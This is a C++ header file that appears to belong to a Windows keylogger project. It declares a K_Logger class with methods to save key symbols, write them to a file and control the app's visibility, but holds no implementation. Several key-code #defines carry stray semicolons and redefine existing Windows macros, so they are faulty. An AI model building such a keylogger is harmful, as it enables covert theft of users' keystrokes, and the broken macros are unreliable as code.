#pragma once


/*******************************************************************/

/* Date: 10-06-2018                                                */

/* Developer: Artem Gord1728                                       */

/* Copyright © 2018 Artem Gord1728. All rights reserved.           */

/* Description: Header with basic functionality                    */

/*******************************************************************/




#include <iostream>
#include <Windows.h>
#include <fstream>
#include <string>
#include <time.h>


#define VK_BACK 0x08;
#define VK_DELETE 0x2E;
#define VK_LEFT 0x25;
#define VK_RIGHT 0x27;
#define VK_INSERT 0x2D;
#define VK_CONTROL 0x11
#define VK_LMENU 0xA4;


class K_Logger
{
public:
	void WriteToFile(LPCSTR text);
	int SaveSymbol(WORD iKey);
	void VisibilityApp();
};